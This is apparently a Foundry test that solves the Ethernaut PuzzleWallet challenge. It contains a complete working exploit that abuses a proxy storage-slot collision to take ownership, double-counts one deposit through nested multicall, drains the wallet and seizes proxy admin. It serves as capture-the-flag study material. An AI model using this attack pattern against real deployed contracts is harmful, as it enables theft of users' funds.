pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../src/ethernaut/core/Ethernaut.sol";
import "../src/ethernaut/24-PuzzleWallet/PuzzleWallet.sol";
import "../src/ethernaut/24-PuzzleWallet/PuzzleWalletFactory.sol";

contract PuzzleWalletTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        //setup
        ethernaut = new Ethernaut();
    }

    function testAttck() public {
        PuzzleWalletFactory factory = new PuzzleWalletFactory();
        ethernaut.registerLevel(factory);

        address levelAddress = ethernaut.createLevelInstance{
            value: 0.001 ether
        }(factory);

        PuzzleWallet wallet = PuzzleWallet(levelAddress);
        //log current owner
        console.log("Current owner: %s", wallet.owner());
        //这里由于代理合约 和 wallet合约 的 storage slot问题 通过proposeNewAdmin 其实修改的是 wallet的owner
        PuzzleProxy(payable(levelAddress)).proposeNewAdmin(address(this));
        console.log("Current owner: %s", wallet.owner());

        //attack

        //add to whitelist
        wallet.addToWhitelist(address(this));

        // wallet balance == can set maxBalance
        console.log("factory balance", wallet.balances(address(factory)));


        //deposit
        bytes[] memory callData = new bytes[](2);
        emit log_bytes(abi.encodeWithSelector(PuzzleWallet.deposit.selector));
        callData[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory attackCallData = new bytes[](1);
        attackCallData[0] = abi.encodeWithSelector(
            PuzzleWallet.deposit.selector
        );
        callData[1] = abi.encodeWithSelector(
            PuzzleWallet.multicall.selector,
            attackCallData
        );

        wallet.multicall{value: 0.001 ether}(callData);

        wallet.execute(address(0), 0.002 ether, "");

        //eth of wallet
        console.log("wallet balance", address(wallet).balance);
        
        //set maxBalance to address(this)
        wallet.setMaxBalance(uint256(uint160(address(this))));

        // attack
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        assert(levelSuccessfullyPassed);
    }

    fallback() external payable {
        console.log("test fallback");
        console.log("msg.value", msg.value);
    }
}
